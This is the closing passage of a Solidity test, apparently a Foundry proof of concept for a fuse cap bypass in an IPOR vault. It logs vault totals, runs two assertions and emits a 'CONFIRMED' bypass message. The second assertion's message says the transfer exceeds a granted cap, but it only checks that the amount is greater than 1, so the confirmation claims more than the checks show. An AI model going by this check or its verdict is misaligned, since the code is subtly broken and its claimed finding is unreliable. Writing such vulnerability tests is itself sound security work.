        emit log_named_uint("actual_vault_total_assets_after", IERC4626(VAULT).totalAssets());
        emit log_named_uint("actual_vault_total_shares_after", IERC20(VAULT).totalSupply());
        assertEq(sent,recieved,"authentic vault debit matches real asset recipient");
        assertGt(sent,1,"actual configured real vault transfer exceeds granted cap");
        emit log_string("CONFIRMED_ACTUAL_FUNDED_IPOR_VAULT_FUSE_CAP_BYPASS");
    }
}
